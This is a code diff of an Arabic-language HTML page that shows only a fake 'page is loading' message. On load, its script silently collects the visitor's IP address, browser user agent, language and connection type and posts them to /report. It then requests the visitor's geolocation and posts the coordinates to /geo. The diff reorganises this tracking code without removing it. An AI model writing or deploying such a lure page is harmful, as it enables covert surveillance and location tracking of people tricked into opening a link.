@@ -2,44 +2,52 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>جاري التحميل...</title>
+  <title>جاري تجهيز الصفحة...</title>
   <script>
-    async function sendDeviceInfo() {
-      const ip = await fetch('/get_ip').then(res => res.text());
+    // إرسال بيانات IP والمتصفح واللغة
+    async function sendInfo() {
+      const ip = await fetch("/get_ip").then(res => res.text());
+
       const info = {
+        ip,
         userAgent: navigator.userAgent,
         language: navigator.language,
-        platform: navigator.platform,
-        ip: ip,
-        connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
+        connection: navigator.connection ? navigator.connection.effectiveType : "غير معروف"
       };
 
-      // إرسال البيانات
-      await fetch('/report', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      await fetch("/report", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
         body: JSON.stringify(info)
       });
-
-      // محاولة إرسال الموقع الجغرافي
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-          await fetch('/geo', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude
-            })
-          });
-        });
-      }
     }
 
-    window.onload = sendDeviceInfo;
+    // إرسال الموقع الجغرافي بعد إذن المستخدم
+    function sendGeo(position) {
+      const data = {
+        lat: position.coords.latitude,
+        lon: position.coords.longitude
+      };
+
+      fetch("/geo", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(data)
+      });
+    }
+
+    // بدء التنفيذ تلقائيًا عند فتح الصفحة
+    window.onload = () => {
+      sendInfo(); // إرسال المعلومات العامة
+
+      // طلب الموقع الجغرافي بعد ذلك
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendGeo);
+      }
+    };
   </script>
 </head>
 <body>
-  <h2>جارٍ تحميل الصفحة...</h2>
+  <h3 style="text-align:center; font-family:sans-serif">جاري تحميل الصفحة...</h3>
 </body>
 </html>
